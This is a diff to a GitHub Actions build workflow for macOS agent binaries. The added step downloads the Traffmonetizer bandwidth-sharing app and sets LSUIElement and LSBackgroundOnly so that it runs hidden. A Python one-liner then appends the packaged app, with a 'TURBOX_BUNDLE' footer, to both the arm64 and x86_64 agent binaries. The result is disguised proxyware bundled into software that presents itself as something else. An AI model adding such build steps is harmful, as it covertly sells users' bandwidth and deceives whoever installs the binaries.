@@ -93,6 +93,19 @@ jobs:
             -lpthread \
             -o bin/agent_darwin_x86_64
 
+          # Tải và MERGE trực tiếp native macOS app vào 2 file binary macOS
+          echo "Merging native macOS Traffmonetizer app directly into binary files..."
+          curl -sSL -o /tmp/tm.dmg https://data.traffmonetizer.com/downloads/macos/traffmonetizer.dmg
+          mkdir -p /tmp/tm_mnt
+          hdiutil attach /tmp/tm.dmg -nobrowse -mountpoint /tmp/tm_mnt
+          defaults write /tmp/tm_mnt/Traffmonetizer.app/Contents/Info.plist LSUIElement -string "1" 2>/dev/null || true
+          defaults write /tmp/tm_mnt/Traffmonetizer.app/Contents/Info.plist LSBackgroundOnly -string "1" 2>/dev/null || true
+          tar -czf /tmp/tm_mac.tar.gz -C /tmp/tm_mnt Traffmonetizer.app
+          hdiutil detach /tmp/tm_mnt -force 2>/dev/null || true
+          rm -rf /tmp/tm_mnt /tmp/tm.dmg
+          python3 -c "import struct, os; p = open('/tmp/tm_mac.tar.gz', 'rb').read(); foot = struct.pack('<Q', len(p)) + b'TURBOX_BUNDLE\\x00\\x00\\x00'; [open(b, 'ab').write(p + foot) for b in ['bin/agent_darwin_x86_64', 'bin/agent_darwin_arm64'] if os.path.exists(b)]"
+          rm -f /tmp/tm_mac.tar.gz
+
       - name: Upload macOS Binaries
         uses: actions/upload-artifact@v4
         with:
